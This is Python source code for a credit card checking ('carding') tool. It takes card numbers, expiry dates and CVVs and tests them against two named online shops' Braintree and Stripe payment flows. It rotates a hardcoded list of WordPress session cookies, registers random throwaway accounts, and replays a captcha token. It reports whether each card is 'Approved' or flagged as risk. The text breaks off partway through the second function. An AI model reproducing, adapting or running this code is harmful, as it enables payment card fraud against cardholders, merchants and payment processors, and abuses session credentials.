import requests
import re
import random
import time
import string
import base64
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
def notauto(ccx):
  import requests
  ccx = ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:  # Mo3gza
    yy = yy.split("20")[1]
  with open('fileb3.txt', 'r') as file:
    first_line = file.readline()
    print(n,mm,yy,cvc)
    user = generate_user_agent() 
    print(user)

    last_used_times = {}

  while True:
    lines = '''aman44%7C1729068200%7CAhlNKSBdyXSb6Tex1yGbZGGL0UAcd8q4UkkK77kKIiy%7C07f026f0088fb411a02e014f1ce906bdf2c11bb7a39dec32c2c76d02228b0656
jakkw8828378%7C1729072193%7CfDCeif42lwb2Xl3xYuc4PrGQUkjiWyLUGKPtCEjAr6D%7C5fa56d93730a9a095e668ebc6b5f159b449b802ea6d26bfa1ef85375828af581
aman4%7C1729600606%7CptP0SC4J395eMhosf3rQy0SioasSudJOAEkCltv3vz4%7C33e9a445cfeee0d1b02a6ec748fd51ba536b710a2461e292db99904ac510997c
29029982dn44%7C1729085674%7CItuoYZQn6KzROVtJ5kiUvtDp0SlrrgBd2Gb610M4sTt%7C3e1e665f28544e8bc232014e6effb315376f2abce8d6ba2a122cb79e00e72ab7
kowo7256%7C1729085833%7CnOLrP4kWrASgr78gUNYikPbY828WCMWJjhVZcGqDgSa%7C75177d0bee277109d2aa00f7ad34a3dcf56b4db8d9d284508eef70888fe582fa
leloland362%7C1729086075%7CDdzeLhvGDpDAOZRjEFODWTbi7mdsfMC4sFun3LeAX4o%7Cdd03481728dd7d4a2c74b027ea7feadb808ed8f86c434e2036bf627ea754b57b
yoursitehacked67%7C1729086268%7C7aeWrBSvLBRmWMjDtmQuz2if9xdQSctlSknynjhm7Yr%7C4bf58f11bc39faafaf3993fe4d837a8c98745ed1d1caef079462e498bc666dbb
make57282%7C1729651702%7CUbdRoOaIkcsQnUHzvHcJ21d4N8M4FYicB0MS6YyrZeZ%7C2660fcd8b56e8a3109e1e92221420bf2d6e67855a2c0dd1e706ebd2d4133e524
skk7885wu273%7C1729652503%7Cg0WGf2MURdyYntd1SypICJW9DJQWwrrBztERLxcGtPX%7C02d6d10eefafd7c5a8d683d8f1eadd3c3ae247b9a6f1507bef653a8987d17ad0
khjk2982%7C1729652714%7C0ExxVYlVwR4pTGe9A4893FH1h6HEwQwcU5VZN9vvupS%7C41a453a300623e6b07e0a3b516e25578247814b97e9b5795cf5841b4e5de0c01
ko572w8922882%7C1729653109%7CrdAbo4v37Ox6BUAQ0U1mdpP9dVQXzVJpEruAzev922a%7Cf64336586416f8e1f8299421159caefb8e7d46bc0f4704dd662a1d5e61306091
nksk2882%7C1729652920%7C0bfUnjYmfgttQcsMAD4TWAL1pO6tp79qedv1AyBVVgZ%7C22cf546285fc109514a4fbb1d2673ccb5ad6eec6a558166f3e82d8883647ab4f
lolnigga682%7C1729652122%7CVBQ3kZh7HwLpWwZLoCkeLAIBJbxGkjGk2hwEDri0dOe%7Cae445954e5069983eafb1881ba6f34143d7d698627ea4aa9cb69c3d0f7f5096c
niggalelelund63%7C1729652241%7CENZNemMVIdlqdF0FWJ6xQ9m7Q4FloW7eiFbDsJgD8qA%7C122a17f6eed10e2ab5e0ef41a05fbdd9612a94459f1389a8aea9b3c46a1e57f8
itsprank35%7C1729086469%7CovQrUPoxrZ3SAs7OwLEzGbt9nFaXcaCrZw3CKJ5Zb67%7C4423c41a1c59cd6d40a6cbef6c2218a03a06b31bde7d9f42d5152682b34205e6'''
    lines = lines.strip().split('\n')
    random_line_number = random.randint(0, len(lines) - 1)
    big = lines[random_line_number]
    current_time = time.time()
    if big in last_used_times:
            time_since_last_use = current_time - last_used_times[big]
            if time_since_last_use < 20:

                continue
    if big == first_line:
      pass
    else:
        last_used_times[big] = current_time
        break
  with open('fileb3.txt', 'w') as file:
    file.write(big)
    print(big)
  cookies = {
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-10-02%2008%3A12%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-10-02%2008%3A12%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '_fbp': 'fb.1.1727858534209.685477442657234647',
    'wordpress_logged_in_5bb3b822b32877fbbb0b41afc4e7a0c4': big,
    'wp_automatewoo_visitor_5bb3b822b32877fbbb0b41afc4e7a0c4': 'kc11jym9ft1vjq5l75hh',
    'wp_automatewoo_session_started': '1',
    'wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788': '43752%7Cother%7Cread%7C125155f306ae1e8539678a350448cf09e4dac4918e332c0b151caa84c9c3595e',
    'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fpayment-methods%2F',
    '__kla_id': 'eyIkZXhjaGFuZ2VfaWQiOiJYWU1ZZ0RRS0VRZFNXazhES1dyakFXVVhFV0ZIMVplY0FUNWw0R0tSWWhjLkpCemFKSiJ9',
}

  headers = {
    'authority': 'alphawolfnutrition.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-02%2008%3A12%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-02%2008%3A12%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _fbp=fb.1.1727858534209.685477442657234647; wordpress_logged_in_5bb3b822b32877fbbb0b41afc4e7a0c4=aman44%7C1729068200%7CAhlNKSBdyXSb6Tex1yGbZGGL0UAcd8q4UkkK77kKIiy%7C07f026f0088fb411a02e014f1ce906bdf2c11bb7a39dec32c2c76d02228b0656; wp_automatewoo_visitor_5bb3b822b32877fbbb0b41afc4e7a0c4=kc11jym9ft1vjq5l75hh; wp_automatewoo_session_started=1; wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788=43752%7Cother%7Cread%7C125155f306ae1e8539678a350448cf09e4dac4918e332c0b151caa84c9c3595e; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fpayment-methods%2F; __kla_id=eyIkZXhjaGFuZ2VfaWQiOiJYWU1ZZ0RRS0VRZFNXazhES1dyakFXVVhFV0ZIMVplY0FUNWw0R0tSWWhjLkpCemFKSiJ9',
    'referer': 'https://alphawolfnutrition.com/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

  response = requests.get('https://alphawolfnutrition.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
  add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
  print(add_nonce)
  client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
  print(client)

  cookies = {
    'wordpress_sec_5bb3b822b32877fbbb0b41afc4e7a0c4'
    '_fbp': 'fb.1.1727858534209.685477442657234647',
    'wordpress_logged_in_5bb3b822b32877fbbb0b41afc4e7a0c4': big,
    'wp_automatewoo_visitor_5bb3b822b32877fbbb0b41afc4e7a0c4': 'kc11jym9ft1vjq5l75hh',
    'wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788': '43752%7Cother%7Cread%7C125155f306ae1e8539678a350448cf09e4dac4918e332c0b151caa84c9c3595e',
    'wp_automatewoo_session_started': '1',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-10-02%2009%3A27%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_first_add': 'fd%3D2024-10-02%2009%3A27%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '__kla_id': 'eyIkZXhjaGFuZ2VfaWQiOiJYWU1ZZ0RRS0VRZFNXazhES1dyakFXVVhFV0ZIMVplY0FUNWw0R0tSWWhjLkpCemFKSiJ9',
    'sbjs_session': 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
}

  headers = {
    'authority': 'alphawolfnutrition.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',    
    'origin': 'https://alphawolfnutrition.com',
    'referer': 'https://alphawolfnutrition.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
}
  data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': client,
}  
  response = requests.post('https://alphawolfnutrition.com/wp-admin/admin-ajax.php', cookies=cookies,headers=headers, data=data)

  ec=(response.json()['data'])

  dec = base64.b64decode(ec).decode('utf-8')

  au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
  print(au)

  headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

  json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '9179a736-cf25-40b1-90be-5f032c8c0b41',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

  response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
  tok = response.json()['data']['tokenizeCreditCard']['token']
  print(tok)

  cookies = {
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-10-02%2008%3A12%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-10-02%2008%3A12%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '_fbp': 'fb.1.1727858534209.685477442657234647',
    'wordpress_logged_in_5bb3b822b32877fbbb0b41afc4e7a0c4': big,
    'wp_automatewoo_visitor_5bb3b822b32877fbbb0b41afc4e7a0c4': 'kc11jym9ft1vjq5l75hh',
    'wp_automatewoo_session_started': '1',
    'wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788': '43752%7Cother%7Cread%7C125155f306ae1e8539678a350448cf09e4dac4918e332c0b151caa84c9c3595e',
    'sbjs_session': 'pgs%3D16%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
    '__kla_id': 'eyIkZXhjaGFuZ2VfaWQiOiJYWU1ZZ0RRS0VRZFNXazhES1dyakFXVVhFV0ZIMVplY0FUNWw0R0tSWWhjLkpCemFKSiJ9',
}

  headers = {
    'authority': 'alphawolfnutrition.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',  
    'origin': 'https://alphawolfnutrition.com',
    'referer': 'https://alphawolfnutrition.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

  data = [
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'master-card'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', tok),
    ('wc_braintree_device_data', '{"correlation_id":"3d3e3d807608835778fe8fc7b573f03d"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"3d3e3d807608835778fe8fc7b573f03d"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'USD'),
    ('wc_braintree_paypal_locale', 'en_us'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', add_nonce),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
  ]

  response = requests.post(
    'https://alphawolfnutrition.com/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
  )
  text=response.text
  html_text=response.text
  soup = BeautifulSoup(html_text, 'html.parser')
  try:
    error_message = soup.find('div', class_='woocommerce-notices-wrapper').text.strip()
    status_code_start = error_message.find('Status code') + len('Status code')
    status_code_end = error_message.find('</div>')
    result = error_message[status_code_start:status_code_end]
  except:
    result=text
    if 'Payment method successfully added.' in text or 'Invalid postal code' in text:
      result = "1000: Approved"  # Indentation fixed here
    elif 'risk_threshold' in text:
      result = "RISK: Retry this BIN later."
    elif 'Please wait for 20 seconds' in text:
      result = "RISK"
    else:
      pass
  if 'avs' in result or '1000: Approved' in result or 'Invalid postal' in result or 'Insufficient Funds' in result:

    return 'Approved'
  else:

    return result
    
    
    
import requests
import re
import random
import string
import base64
from getuseragent import UserAgent
from user_agent import generate_user_agent

def Tele3(ccx):
    ccx = ccx.strip()
    parts = re.split(r'[ |/]', ccx)
    n = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvc = parts[3]

    print(n, mm, yy, cvc)

    r = requests.session()
    user = generate_user_agent()

    def generate_random_account():
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=4))
        return f"{name}{number}@yahoo.com"
    acc = generate_random_account()

    def username():
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=20))
        return f"{name}{number}"
    username = username()

    def generate_random_code(length=32):
        letters_and_digits = string.ascii_letters + string.digits
        return ''.join(random.choice(letters_and_digits) for _ in range(length))

    corr = generate_random_code()
    sess = generate_random_code()

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User ': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User -Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    response = r.get('https://aptekaleki24.co.uk/my-account-2', cookies=r.cookies, headers=headers)

    register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)

    headers = {
        'authority': 'aptekaleki24.co.uk',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://aptekaleki24.co.uk',
        'referer': 'https://aptekaleki24.co.uk/my-account-2',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }

    data = {
        'email': acc,
        'privacy_policy': 'on',
        'woocommerce-register-nonce': register,
        '_wp_http_referer': '/my-account-2',
        'register': 'Zarejestruj się',
    }

    response = r.post('https://aptekaleki24.co.uk/my-account-2', cookies=r.cookies, headers=headers, data=data)

    headers = {
        'authority': 'aptekaleki24.co.uk',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://aptekaleki24.co.uk/my-account-2/payment-methods',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }

    response = r.get('https://aptekaleki24.co.uk/my-account-2/add-payment-method', cookies=r.cookies, headers=headers)

    nonce = re.findall(r'"add_card_nonce":"(.*?)"', response.text)[0]
    print(nonce)

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': user,
    }

    data = f'type=card&billing_details[name]=+&billing_details[email]=makk2882%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=07085d6f-c819-4cc2-bf19-bbd3c19e0b4ec756b1&muid=b0cef40a-e0b4-4f5f-8b68-ae5c25ed66fb0f87ec&sid=27d86006-21ea-4836-87aa-f33def9368bbb523ef&pasted_fields=number&payment_user_agent=stripe.js%2F8f1da5bf41%3B+stripe-js-v3%2F8f1da5bf41%3B+card-element&referrer=https%3A%2F%2Faptekaleki24.co.uk&time_on_page=50390&key=pk_live_51IQzDCBKZpsKrCkNMyqzdD1smhnXungJIcpefiOevrq8VOUZc4YE2ehVLdUr6NMTqMWzY5bA3d3o9petmZSoOyvU00u8Awtmy3&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoibENSc09Jbjd6MU1BZDRtaDZVcE1TbUVEMVAra2RzS0RSelhrZDVPWVlHdmMvTVg5N0haeUN1SnEraDdsazhER01GdGNMYmFyTkg2Z1NlSWpsNzQwcTVDTG80OXJvcHZWclFZTUpIRExJYVVWd0Q3cHdtVWZDTVQxQURHM2NLRi9pMU96WFo4Umd4Q1pmLzJPb2F2RHRvK2lUS0ZsL2RDdlV5dXFyL1owSXZManAzT0JRSXNhVGlvS3cwRENyc0xkeXR1TURjYzZyem1XUEEvdkhGMWRLUTMwb2k5MUhHRnFoR1pNWWVsNUpwWGpsNWFLZmltZjBuREZjNHJCUWJDOXlHMFlRTUFoc281MUpvQjBRS0lJK0JRVHRFWjhGUld1QlRhcFp4WkFlQ3prSUpYejVUeldBTEZyYlpiRnBienErRC9ML0IyUllIN25xdGFkVXpEK2pFTE5rU29HY0kvL29pbXBMYzA4MkdGK3FKanpjTFlqYmt1U0JrbnZNazdzM0RTWHhWZzl4OE04KzcvWmNqRC96WE VaQStVZ jdYQVpUcXV5TmZFeXVkZjRDRGUvdy9GakxQSnJnOWpMck04VE0xY2x4blJ1T0V5dWlQdTMxZUJabkk1TXRtcHNSRUVtYUZvVFl5WHVSZW1xNTBBdEphNUxLQjlCZGxneHRDMFozbExlU1Z0ZFNqNFFqZXI3cXVUOGhoWEd2T0dwdzhzYVB4bkV3bHBNbHU0ckNDR1NqN2tNVDRSS3BZUVZXeVZobnRtcGZ6VjhrL243S0lZeUhrZFFRZDhsVmxxNmtxSEt2THNaNzNIZVEzUUFEbnpRS1pRL3NYUm9xYUh3TWFJOW5wcDNOeXZ4VmNEMzhhNngzcjVLMnl5U3RxSVBFSWhhMjJkdDJVazlFemk4UmNTYXpiODhpY3NLdHdTbGlRa1ErbmpWSW9zMFJhdGlpUnV2anNlNU9BbStLMjRDeVo3Sys0M3BNaE1ib2hPWGIvYjlYOGFJcUtkM1Zxa1c0a0ZIVTJ6MFNQSTE5ZFVOWEZ3SFowa1Q3dlc0ckhjdVZ6NVFqMGFkbFg1RVdQYXhWRU1wQURvRVltdmVwbUZPRGd3azFXL2JTb2NSak5QTE5YbjNDL3Y3UXNzZFR1R0Rxb2pHNXlYeWZLL25USXNZeThMeW9Id1hEbFU1cXlKUkQ4ZXFOYmJjU1hkZmNnMk91UTlHYnhoYWk4b3pXcG5IY1dZRC9rdXlBb0ljRk94eDErT0VmMS9CajcxRUQwN1VldC9rRlFLZFd4a0xwZ1NPQ0U5Vkd5OGR3TnN5OGt3N2x4QjJEU1FtVXJLK1lFUjdpRWl2MnhIREpvMHdRdkpVYVpkYzBOcVpNRk9JNU5rUkdVSkF5UFJ2cnpRQXhqUmJ2MmZmT1ZvWExuWFFBL2FldUgzMEdHaGIraFd5em1RblNLOXRIeGtTWU5NNFRmNjg5NGJUNG1KSVVwdlZsTy9jRkpSUXA1UE5ZUWQyWCtkbHVxMmhzd0ZRY212SnhEZWxKQzhjNjV3djFRTi9rcXNxZWI0OGExWU9FSjNZU2Q5T3ZudmlMczRqRk9HTjFJMFFNUXBhRUFtU3AvRldxRGxuS1dhbUg3VnM1ZFN5S2Z0cWZXa2xGczhwSWRBMGJCL1FHVnpKbzFQMWVlYW1Ia2FPeERSMDlKd09sL1kvSG81T3lyQ2ZwZUJoWWFpa0s2MVFoR1lROWJWL3d3bUJjcnRvc3NxUlZrU25nRk80bnpveC9QZjNWUU5ZbG5EOENpaEFxOW5GQXBwNTZzcm5odzVZcVZNU1lPYUFhWnB4M1UwVWNGUS9ibHBpei9rUTZaY25TRTIxN3ZaYzRtVUszYVV6aWd6WHY5ZkZmYUVpTGF6MHN3RWdJSEU2a25WbmtLMHFUQ1FSWTArUlU3VGh1'

    response = requests .post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

    if not 'id' in response.json():
        print('ERORR CARD')
    else:
        id = response.json()['id']
        print(id)

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://aptekaleki24.co.uk',
        'referer': 'https://aptekaleki24.co.uk/my-account-2/add-payment-method',
